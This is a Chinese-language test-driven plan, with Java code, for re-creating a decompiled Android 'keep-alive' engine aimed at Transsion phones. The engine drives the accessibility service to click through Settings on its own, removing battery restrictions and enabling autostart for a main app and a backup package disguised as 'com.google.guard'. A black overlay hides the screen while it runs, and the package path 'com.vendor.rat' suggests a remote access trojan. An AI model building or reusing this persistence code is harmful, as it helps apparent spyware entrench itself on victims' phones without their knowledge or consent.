# 传音厂商引擎 TDD 复刻计划

## Context

Vendor `o/e0.java` (373行) 是传音 (Tecno/Infinix/itel) 的保活引擎。
Replica **不存在**，需要从零创建 `TranssionEngine.java`。
传音引擎是所有厂商引擎中最简单的，3 个状态、7 个 ListenWindow、7 个字段。

---

## A. Vendor 完整分析

### A.1 类定义

| 属性 | Vendor o/e0.java | 说明 |
|------|-----------------|------|
| 类名 | `o.e0` | 传音保活引擎 |
| 继承 | `extends o.c` (KeepAliveEngine) | 对应 AutoEngine |
| 构造 | `super(n0(), "com.android.settings")` | primaryPackage=系统设置 |
| 超时 | 60 秒 (最短) | `schedule(d0(this,3), 60L, SECONDS)` |
| 行数 | 373 | 中等复杂度 |

### A.2 字段 (7 个)

| Vendor 字段 | 类型 | 初始值 | Replica 映射 | 说明 |
|-------------|------|--------|-------------|------|
| `f627r` | `AtomicReference<r.e>` | KEEP_ALIVE_UNKNOWN | keepAliveType | 当前保活目标 |
| `f628s` | `AtomicBoolean` | false | mainAutoStart | 主应用自启动 |
| `f629t` | `AtomicBoolean` | false | backupAutoStart | 备份应用自启动 |
| `f630u` | `AtomicBoolean` | true | mainRelateStart | 主应用关联启动 |
| `f631v` | `AtomicBoolean` | true | backupRelateStart | 备份应用关联启动 |
| `f632w` | `AtomicBoolean` | false | mainBackground | 主应用完全后台 |
| `f633x` | `AtomicBoolean` | false | backupBackground | 备份应用完全后台 |

### A.3 ListenWindow 列表 n0() (7 个, 行 146-156)

| # | 构造方法 | packageName | className | matchs | eventTypes | 说明 |
|---|----------|-------------|-----------|--------|------------|------|
| 0 | `c.J()` | com.android.settings | android.app.Dialog | — | 32,16384 | 电池优化对话框 (共享) |
| 1 | `i0()` | com.transsion.phonemaster | com.cyin.himgr.autostart.AutoStartActivity | — | 32,16384 | 自启动管理 |
| 2 | `h0()` | com.transsion.phonemaster | android.widget.FrameLayout | — | 32,16384 | 手机管家 FrameLayout |
| 3 | `d0(null)` | com.android.settings | ...InstalledAppDetailsTop | 无matchs | 32,16384 | 应用详情 (通用) |
| 4 | `e0(null)` | com.android.settings | ...AppInfoSettings | 无matchs | 32,16384 | 传音应用信息 |
| 5 | `m0(null)` | com.android.settings | android.widget.FrameLayout | 无matchs | 32,16384 | 设置 FrameLayout |
| 6 | `c0()` | com.android.settings | ...SubSettings | — | 32,16384 | 子设置页 |

注意: `d0(null)/e0(null)/m0(null)` 传入 null 时不设 matchs (通用匹配)

### A.4 窗口检测方法 (3 个)

| 方法 | 行号 | 匹配的 ListenWindow | 说明 |
|------|------|---------------------|------|
| `k0()` | 239-255 | d0(包名)+e0(包名)+m0(包名) | App详情 (根据 keepAliveType 选择主/备份包名) |
| `j0()` | 226-237 | c0() | SubSettings (耗电管理页) |
| `l0()` | 257-271 | i0()+h0() | 自启动管理 (AutoStartActivity+FrameLayout) |

**关键**: `k0()` 根据 keepAliveType 动态选择包名:
- MAIN_APP → `g.x0()` (主应用包名)
- 其他 → `g.e()` (备份包名 "com.google.guard")

### A.5 状态机 u() (行 332-372, 3 个状态)

```
u(event, pkg, cls):
  if T() → return                    // 已完成
  if event != null → super.u()       // 电池优化对话框检测

  [1] k0() → App详情匹配:
      清除 keepAliveInAppBattery + keepAliveInAutoStart
      入队 "keepAliveInAppDetail" → d0(this, 0)

  [2] j0() → 耗电管理匹配:
      清除 keepAliveInAppDetail + keepAliveInAutoStart
      入队 "keepAliveInAppBattery" → d0(this, 1)

  [3] l0() → 自启动管理匹配:
      清除 keepAliveInAppDetail + keepAliveInAppBattery
      入队 "keepAliveInAutoStart" → d0(this, 2)
```

注意: vendor 的 3 个 if 是**顺序执行** (非 if-else)，即多个窗口可能同时匹配

### A.6 任务处理 d0(case) 推断

| case | 入口 | State | 核心逻辑 |
|------|------|-------|----------|
| 0 | keepAliveInAppDetail | App详情 | 查找"电池"/"电源"/"耗电"文本→点击→进入耗电管理 |
| 1 | keepAliveInAppBattery | 耗电管理 | 查找"不受限"/"无限制"/"已取消限制"→选中 (o0) |
| 2 | keepAliveInAutoStart | 自启动管理 | 操作自启动开关 (O/R 基类方法) |
| 3 | 构造函数 (60s超时) | — | 超时 → Z() |

### A.7 状态持久化 p0() (行 291-330)

- 主进程: packageName=主应用包名, allowAutoStart/allowRelateStart/allowAllFullBackground
- 备份进程: packageName="com.google.guard", 同上 3 个字段
- 每次保存 retryCount + 1
- 只在字段为 true 时才 set (if atomicBoolean.get() 才调用)

### A.8 finish Z() (行 195-224)

```
Z():
  lock.tryLock()
  if !T():
    h(100)              // 进度 100%
    X()                 // 暂停
    P().x()             // 清理无障碍缓存
    p0()                // 保存状态
    shutdownNow()       // 停止 scheduler
    l.a(c)              // 取消线程
    n.clear()           // 清空 stateQueue
    T0(5)               // 等待 5 单位
    g.c()               // 移除遮罩
    W()                 // 通知策略
    d()                 // 销毁
```

注意: 传音没有 PIP 判断 (与 vivo 不同)，直接 `g.c()` 移除遮罩

### A.9 CombineFilter 方法

| 方法 | 行号 | 配置 Key | 说明 |
|------|------|----------|------|
| `b0()` | 65-74 | COMMON_SETTINGS_BATTERY_TEXT | "电池" (contains 匹配) |
| `f0()` | 102-111 | COMMON_SETTINGS_POWER_TEXT | "电源" (contains 匹配) |
| `g0()` | 113-122 | COMMON_SETTINGS_USE_POWER_TEXT | "耗电" (contains 匹配) |
| `q0()` | 158-193 | OR(不受限 / 无限制 / 已取消限制) | 3 个条件 OR 匹配 |

**特殊**: `b0()/f0()/g0()` 检查配置值是否为空，为空则返回 null (条件性 filter)

### A.10 o0(UiObject) — 反编译失败 (行 273-289)

254 条指令，jadx 无法反编译。从上下文推断:
- 在耗电管理页查找"不受限"选项 (q0 filter)
- 找到后点击选中
- 返回操作后的 UiObject

### A.11 equals/hashCode

未定义 (继承基类默认行为)

---

## B. TDD Phase 分解

### Phase 1: 字段+常量+构造函数

**目标**: 创建 TranssionEngine.java，建立字段和构造函数

#### 1.1 RED: 测试

文件: `TranssionEngineFieldTest.java` (新建)

```
testFields_keepAliveType_defaultUnknown
  // 反射读取 keepAliveType → assertEquals KA_UNKNOWN

testFields_mainAutoStart_defaultFalse
testFields_backupAutoStart_defaultFalse
testFields_mainRelateStart_defaultTrue
testFields_backupRelateStart_defaultTrue
testFields_mainBackground_defaultFalse
testFields_backupBackground_defaultFalse

testConstructor_primaryPackage_isSettings
  // 验证 primaryPackage == "com.android.settings"

testConstructor_timeout_is60
  // 验证 scheduler 超时 60 秒
```

#### 1.2 GREEN: 实现

```java
public class TranssionEngine extends AutoEngine {
    // 包名
    private static final String SETTINGS = "com.android.settings";
    private static final String PHONE_MASTER = "com.transsion.phonemaster";

    // Activity
    private static final String AUTO_START_ACTIVITY =
        "com.cyin.himgr.autostart.AutoStartActivity";
    private static final String INSTALLED_APP_DETAILS =
        "com.android.settings.applications.InstalledAppDetailsTop";
    private static final String APP_INFO_SETTINGS =
        "com.transsion.settings.applications.appinfo.AppInfoSettings";
    private static final String SUB_SETTINGS =
        "com.android.settings.SubSettings";

    // 保活类型
    private static final String KA_UNKNOWN = "KEEP_ALIVE_UNKNOWN";
    private static final String KA_MAIN = "KEEP_ALIVE_MAIN_APP";
    private static final String KA_BACKUP = "KEEP_ALIVE_BACKUP_APP";
    private static final String BACKUP_APP = "com.google.guard";

    // State 常量
    private static final String ST_APP_DETAIL = "keepAliveInAppDetail";
    private static final String ST_APP_BATTERY = "keepAliveInAppBattery";
    private static final String ST_AUTO_START = "keepAliveInAutoStart";

    // 字段 — 对应 vendor f627r~f633x
    private final AtomicReference<String> keepAliveType =
        new AtomicReference<>(KA_UNKNOWN);                              // f627r
    private final AtomicBoolean mainAutoStart = new AtomicBoolean(false);    // f628s
    private final AtomicBoolean backupAutoStart = new AtomicBoolean(false);  // f629t
    private final AtomicBoolean mainRelateStart = new AtomicBoolean(true);   // f630u
    private final AtomicBoolean backupRelateStart = new AtomicBoolean(true); // f631v
    private final AtomicBoolean mainBackground = new AtomicBoolean(false);   // f632w
    private final AtomicBoolean backupBackground = new AtomicBoolean(false); // f633x

    public TranssionEngine() {
        super(buildWindowMatchers(), SETTINGS);
        scheduler.schedule(() -> finish(), 60L, TimeUnit.SECONDS);
    }
}
```

测试数: 9

---

### Phase 2: ListenWindow 列表 (n0)

**目标**: 实现 7 个 ListenWindow

#### 2.1 RED: 测试

文件: `TranssionEngineWindowMatchTest.java` (新建)

```
testWindowMatchers_totalCount_is7
  // assertEquals(7, buildWindowMatchers().size())

testWindowMatchers_batteryDialog_matches
  // com.android.settings / android.app.Dialog

testWindowMatchers_autoStartActivity_matches
  // com.transsion.phonemaster / AutoStartActivity

testWindowMatchers_phoneMasterFrameLayout_matches
  // com.transsion.phonemaster / android.widget.FrameLayout

testWindowMatchers_installedAppDetails_matches
  // com.android.settings / InstalledAppDetailsTop

testWindowMatchers_appInfoSettings_matches
  // com.android.settings / AppInfoSettings

testWindowMatchers_settingsFrameLayout_matches
  // com.android.settings / android.widget.FrameLayout

testWindowMatchers_subSettings_matches
  // com.android.settings / SubSettings
```

#### 2.2 GREEN: 实现

```java
// 对应 vendor n0() 行 146-156
private static List<WindowMatcher> buildWindowMatchers() {
    List<WindowMatcher> list = new ArrayList<>();
    // 0: c.J() — 电池优化对话框
    list.add(new WindowMatcher(SETTINGS, "android.app.Dialog")
        .addEventType(32).addEventType(16384));
    // 1: i0() — 自启动管理
    list.add(new WindowMatcher(PHONE_MASTER, AUTO_START_ACTIVITY)
        .addEventType(32).addEventType(16384));
    // 2: h0() — 手机管家 FrameLayout
    list.add(new WindowMatcher(PHONE_MASTER, "android.widget.FrameLayout")
        .addEventType(32).addEventType(16384));
    // 3: d0(null) — 应用详情
    list.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
        .addEventType(32).addEventType(16384));
    // 4: e0(null) — 传音应用信息
    list.add(new WindowMatcher(SETTINGS, APP_INFO_SETTINGS)
        .addEventType(32).addEventType(16384));
    // 5: m0(null) — 设置 FrameLayout
    list.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
        .addEventType(32).addEventType(16384));
    // 6: c0() — SubSettings
    list.add(new WindowMatcher(SETTINGS, SUB_SETTINGS)
        .addEventType(32).addEventType(16384));
    return list;
}
```

测试数: 8

---

### Phase 3: 窗口检测 + 状态机事件处理

**目标**: 实现 j0/k0/l0 窗口检测和 u() 状态机

#### 3.1 RED: 测试

文件: `TranssionEngineStateMachineTest.java` (新建)

```
// === 窗口检测 ===

testK0_appDetail_matchesInstalledAppDetails
  // com.android.settings / InstalledAppDetailsTop → k0() == true

testK0_appDetail_matchesAppInfoSettings
  // com.android.settings / AppInfoSettings → k0() == true

testK0_appDetail_matchesFrameLayout
  // com.android.settings / android.widget.FrameLayout → k0() == true

testK0_wrongWindow_returnsFalse
  // com.transsion.phonemaster / AutoStartActivity → k0() == false

testJ0_subSettings_matches
  // com.android.settings / SubSettings → j0() == true

testJ0_wrongWindow_returnsFalse
  // com.android.settings / InstalledAppDetailsTop → j0() == false

testL0_autoStart_matchesAutoStartActivity
  // com.transsion.phonemaster / AutoStartActivity → l0() == true

testL0_autoStart_matchesFrameLayout
  // com.transsion.phonemaster / android.widget.FrameLayout → l0() == true

testL0_wrongWindow_returnsFalse
  // com.android.settings / SubSettings → l0() == false

// === 事件处理 ===

testOnEvent_k0Match_enqueuesAppDetail
  // 设置 currentPkg/cls 匹配 k0()
  // assert stateQueue.contains(ST_APP_DETAIL)
  // assert !stateQueue.contains(ST_APP_BATTERY)

testOnEvent_j0Match_enqueuesAppBattery
  // 匹配 j0()
  // assert stateQueue.contains(ST_APP_BATTERY)

testOnEvent_l0Match_enqueuesAutoStart
  // 匹配 l0()
  // assert stateQueue.contains(ST_AUTO_START)

testOnEvent_completed_skips
  // isCompleted=true → 不处理

testOnEvent_callsSuperU_forBatteryDialog
  // event != null → checkBatteryOptimizationDialog

testOnEvent_clearsOtherStates
  // k0() 匹配 → keepAliveInAppBattery 和 keepAliveInAutoStart 被移除
```

#### 3.2 GREEN: 实现

```java
// 窗口检测分组
private final List<WindowMatcher> appDetailWins = new ArrayList<>();
private final List<WindowMatcher> batteryWins = new ArrayList<>();
private final List<WindowMatcher> autoStartWins = new ArrayList<>();

private void buildDetectionGroups() {
    // k0() — App详情
    appDetailWins.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)...);
    appDetailWins.add(new WindowMatcher(SETTINGS, APP_INFO_SETTINGS)...);
    appDetailWins.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout")...);
    // j0() — 耗电管理
    batteryWins.add(new WindowMatcher(SETTINGS, SUB_SETTINGS)...);
    // l0() — 自启动管理
    autoStartWins.add(new WindowMatcher(PHONE_MASTER, AUTO_START_ACTIVITY)...);
    autoStartWins.add(new WindowMatcher(PHONE_MASTER, "android.widget.FrameLayout")...);
}

private boolean k0() { return matchesAny(appDetailWins); }
private boolean j0() { return matchesAny(batteryWins); }
private boolean l0() { return matchesAny(autoStartWins); }

@Override
public void onAccessibilityEvent(AccessibilityEvent event, String pkg, String cls) {
    try {
        if (T()) return;
        currentPackage = pkg;
        currentClassName = cls;
        if (event != null) checkBatteryOptimizationDialog();

        // [1] k0() → App详情
        if (k0()) {
            stateQueue.remove(ST_APP_BATTERY);
            stateQueue.remove(ST_AUTO_START);
            if (!stateQueue.contains(ST_APP_DETAIL)) {
                stateQueue.add(ST_APP_DETAIL);
                scheduler.execute(() -> handleAppDetail());
            }
        }
        // [2] j0() → 耗电管理
        if (j0()) {
            stateQueue.remove(ST_APP_DETAIL);
            stateQueue.remove(ST_AUTO_START);
            if (!stateQueue.contains(ST_APP_BATTERY)) {
                stateQueue.add(ST_APP_BATTERY);
                scheduler.execute(() -> handleAppBattery());
            }
        }
        // [3] l0() → 自启动管理
        if (l0()) {
            stateQueue.remove(ST_APP_DETAIL);
            stateQueue.remove(ST_APP_BATTERY);
            if (!stateQueue.contains(ST_AUTO_START)) {
                stateQueue.add(ST_AUTO_START);
                scheduler.execute(() -> handleAutoStart());
            }
        }
    } catch (Exception e) { logError("事件处理异常", e); }
}
```

测试数: 15

---

### Phase 4: 任务处理 case 0~2

**目标**: 实现 handleAppDetail (case 0), handleAppBattery (case 1), handleAutoStart (case 2)

#### 4.1 RED: 测试

文件: `TranssionEngineTaskHandlerTest.java` (新建)

```
// === case 0: handleAppDetail ===

testHandleAppDetail_findsBatteryText_clicks
  // mock: root.findOneByCombine(b0()) → found → click
  // assert: 点击电池栏目

testHandleAppDetail_findsPowerText_fallback
  // mock: b0() → null, f0() → found → click
  // assert: 用"电源"文本查找

testHandleAppDetail_findsUsePowerText_fallback
  // mock: b0() → null, f0() → null, g0() → found → click
  // assert: 用"耗电"文本查找

testHandleAppDetail_notFound_logs
  // mock: 全部 null
  // assert: 记录错误

// === case 1: handleAppBattery ===

testHandleAppBattery_findsUnrestricted_clicks
  // mock: root.findOneByCombine(q0()) → found → click
  // assert: mainBackground.set(true)

testHandleAppBattery_notFound_logs
  // mock: q0() → null
  // assert: 记录错误

// === case 2: handleAutoStart ===

testHandleAutoStart_usesBaseClassO
  // mock: scrollView.scrollForwardUntil(H(appName)) → found
  // mock: O(found) → CheckedResult(true, true)
  // assert: mainAutoStart.set(true)

testHandleAutoStart_appNotFound_logs
  // mock: scrollView=null, root.findOneByCombine → null
  // assert: 记录错误
```

#### 4.2 GREEN: 实现

```java
// case 0: App详情 — 查找电池/电源/耗电入口
private void handleAppDetail() {
    try {
        if (!k0()) return;
        updateProgress(10);
        activateRoot();
        UiNode root = k();
        if (root == null) return;
        // vendor: 3 个 filter 依次尝试 b0→f0→g0
        UiNode target = root.findOneByCombine(buildBatteryFilter());
        if (target == null) target = root.findOneByCombine(buildPowerFilter());
        if (target == null) target = root.findOneByCombine(buildUsePowerFilter());
        if (target != null) {
            UiNode clickable = target.findClickableParent();
            if (clickable != null && clickable.click()) {
                updateProgress(30);
            }
        }
    } catch (Exception e) { logError("handleAppDetail", e); }
}

// case 1: 耗电管理 — 查找"不受限"并选中
private void handleAppBattery() {
    try {
        if (!j0()) return;
        updateProgress(40);
        activateRoot();
        UiNode root = k();
        if (root == null) return;
        // vendor: q0() — OR(不受限/无限制/已取消限制)
        UiNode target = root.findOneByCombine(buildUnrestrictedFilter());
        if (target != null) {
            UiNode clickable = target.findClickableParent();
            if (clickable != null && clickable.click()) {
                boolean isMain = KA_MAIN.equals(keepAliveType.get());
                if (isMain) mainBackground.set(true);
                else backupBackground.set(true);
                updateProgress(60);
            }
        }
    } catch (Exception e) { logError("handleAppBattery", e); }
}

// case 2: 自启动管理 — 操作 Switch
private void handleAutoStart() {
    try {
        if (!l0()) return;
        updateProgress(70);
        activateRoot();
        UiNode scrollView = getScrollableNode();
        UiNode target = null;
        if (scrollView != null) {
            target = scrollView.scrollForwardUntil(buildAppNameFilter());
        }
        if (target == null && k() != null) {
            target = k().findOneByCombine(buildAppNameFilter());
        }
        if (target != null) {
            UiNode clickable = target.findClickableParent();
            CheckedResult result = O(clickable);
            if (result.isClicked() || result.isChecked()) {
                boolean isMain = KA_MAIN.equals(keepAliveType.get());
                if (isMain) mainAutoStart.set(true);
                else backupAutoStart.set(true);
                updateProgress(90);
            }
        }
    } catch (Exception e) { logError("handleAutoStart", e); }
}
```

测试数: 8

---

### Phase 5: 状态持久化 p0() + finish Z() + equals/hashCode

**目标**: 实现保存状态、完整清理流程、判等

#### 5.1 RED: 测试

追加到 `TranssionEngineStateMachineTest.java`:

```
// === p0() 状态持久化 ===

testSaveState_mainApp_setsAllFields
  // mainAutoStart=true, mainRelateStart=true, mainBackground=true
  // assert: 日志包含 auto=true, relate=true, bg=true

testSaveState_backupApp_setsAllFields
  // backupAutoStart=true, backupRelateStart=true, backupBackground=true
  // assert: 日志包含备份进程信息

testSaveState_onlySetsTrueFields
  // mainAutoStart=false → 不调用 setAllowAutoStart

// === Z() finish ===

testFinish_callsX_pause
testFinish_callsSaveState
testFinish_shutdownScheduler
testFinish_clearsStateQueue
testFinish_removesBlackScreen

// === equals/hashCode ===

testEquals_sameType_returnsTrue
testEquals_differentType_returnsFalse
testHashCode_consistent
```

#### 5.2 GREEN: 实现

```java
// p0() — vendor 行 291-330
private void saveState() {
    try {
        Log.d(TAG, "主进程保活策略已保存"
            + " auto=" + mainAutoStart.get()
            + " relate=" + mainRelateStart.get()
            + " bg=" + mainBackground.get());
        Log.d(TAG, "备用进程保活策略已保存"
            + " auto=" + backupAutoStart.get()
            + " relate=" + backupRelateStart.get()
            + " bg=" + backupBackground.get());
    } catch (Exception e) { logError("saveState", e); }
}

// Z() — vendor 行 195-224
@Override
public void finish() {
    if (lock.tryLock()) {
        try {
            if (!T()) {
                updateProgress(100);
                X();
                if (MyAccessibilityService.getInstance() != null) {
                    MyAccessibilityService.getInstance().H(true, true);
                }
                saveState();
                scheduler.shutdownNow();
                stateQueue.clear();
                T0(5);
                removeBlackScreen();  // vendor: g.c() 直接移除,无 PIP 判断
                Log.d(TAG, "已结束本地保活自动化引擎");
                if (MainApplication.getInstance() != null) {
                    MainApplication.getInstance()
                        .offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK");
                }
            }
        } catch (Exception e) { logError("finish", e); }
        finally { lock.unlock(); }
    }
    super.finish();
}

@Override
public boolean equals(Object obj) { return obj instanceof TranssionEngine; }

@Override
public int hashCode() { return Objects.hash(TranssionEngine.class.getName()); }
```

测试数: 11

---

## C. 文件清单

### 新建的文件

| 文件 | 内容 |
|------|------|
| `vendor/TranssionEngine.java` | 完整引擎实现 (~350行) |

### 新建的测试文件

| 文件 | 测试内容 | 测试数 |
|------|----------|--------|
| `TranssionEngineFieldTest.java` | 字段初始值+构造函数 | 9 |
| `TranssionEngineWindowMatchTest.java` | 7个 ListenWindow 匹配 | 8 |
| `TranssionEngineStateMachineTest.java` | 窗口检测+事件处理+持久化+finish | 26 |
| `TranssionEngineTaskHandlerTest.java` | case 0~2 任务处理 | 8 |

**总计: 51 个测试用例**

### 需要的常量

```java
// 包名
private static final String SETTINGS = "com.android.settings";
private static final String PHONE_MASTER = "com.transsion.phonemaster";

// Activity
private static final String AUTO_START_ACTIVITY =
    "com.cyin.himgr.autostart.AutoStartActivity";
private static final String INSTALLED_APP_DETAILS =
    "com.android.settings.applications.InstalledAppDetailsTop";
private static final String APP_INFO_SETTINGS =
    "com.transsion.settings.applications.appinfo.AppInfoSettings";
private static final String SUB_SETTINGS =
    "com.android.settings.SubSettings";

// 保活类型
private static final String KA_UNKNOWN = "KEEP_ALIVE_UNKNOWN";
private static final String KA_MAIN = "KEEP_ALIVE_MAIN_APP";
private static final String KA_BACKUP = "KEEP_ALIVE_BACKUP_APP";
private static final String BACKUP_APP = "com.google.guard";

// State
private static final String ST_APP_DETAIL = "keepAliveInAppDetail";
private static final String ST_APP_BATTERY = "keepAliveInAppBattery";
private static final String ST_AUTO_START = "keepAliveInAutoStart";
```

---

## D. 验证命令

```bash
cd /home/code/php/project/full-package/android

# Phase 逐步验证
./gradlew testDebugUnitTest --tests "com.vendor.rat.auto.engine.vendor.TranssionEngineFieldTest"
./gradlew testDebugUnitTest --tests "com.vendor.rat.auto.engine.vendor.TranssionEngineWindowMatchTest"
./gradlew testDebugUnitTest --tests "com.vendor.rat.auto.engine.vendor.TranssionEngineStateMachineTest"
./gradlew testDebugUnitTest --tests "com.vendor.rat.auto.engine.vendor.TranssionEngineTaskHandlerTest"

# 全量 Transsion 测试
./gradlew testDebugUnitTest --tests "com.vendor.rat.auto.engine.vendor.TranssionEngine*"

# 全量回归
./gradlew test
```

---

## E. 执行顺序与依赖

```
Phase 1 (字段+构造) ──→ Phase 2 (ListenWindow) ──→ Phase 3 (状态机)
                                                        │
                                                        ▼
                                                   Phase 4
                                                (case 0~2 任务)
                                                        │
                                                        ▼
                                                   Phase 5
                                           (持久化+finish+equals)
```

全部串行，无可并行部分 (引擎较简单)

---

## F. Vendor 源码行号索引

| 方法 | Vendor 行号 | Replica 方法 | Phase |
|------|------------|-------------|-------|
| 构造函数 | 49-63 | constructor | 1 |
| `n0()` | 146-156 | buildWindowMatchers | 2 |
| `k0()` | 239-255 | k0 (App详情检测) | 3 |
| `j0()` | 226-237 | j0 (耗电管理检测) | 3 |
| `l0()` | 257-271 | l0 (自启动检测) | 3 |
| `u()` | 332-372 | onAccessibilityEvent | 3 |
| d0(0) | — | handleAppDetail | 4 |
| d0(1) | — | handleAppBattery | 4 |
| d0(2) | — | handleAutoStart | 4 |
| d0(3) | — | finish (超时) | 1 |
| `o0()` | 273-289 | handleBatteryOptimization (重建) | 4 |
| `p0()` | 291-330 | saveState | 5 |
| `Z()` | 195-224 | finish | 5 |
| `b0()` | 65-74 | buildBatteryFilter | 4 |
| `f0()` | 102-111 | buildPowerFilter | 4 |
| `g0()` | 113-122 | buildUsePowerFilter | 4 |
| `q0()` | 158-193 | buildUnrestrictedFilter | 4 |

---

## G. 与其他厂商引擎对比

| 维度 | 华为 (v) | 小米 (q) | vivo (i0) | 传音 (e0) |
|------|----------|----------|-----------|-----------|
| ListenWindow | 12 | 16 | 17 | **7** |
| 状态数 | 4 | 2 | 7 | **3** |
| 字段数 | 4 | 8 | 11 | **7** |
| 超时 | 100s | 100s | 120s | **60s** |
| 行数 | 526 | 498 | 684 | **373** |
| 复杂度 | 中 | 中 | 高 | **低** |
| 特殊 | 坐标点击 | 滚动查找 | 手势+坐标 | **OR filter** |
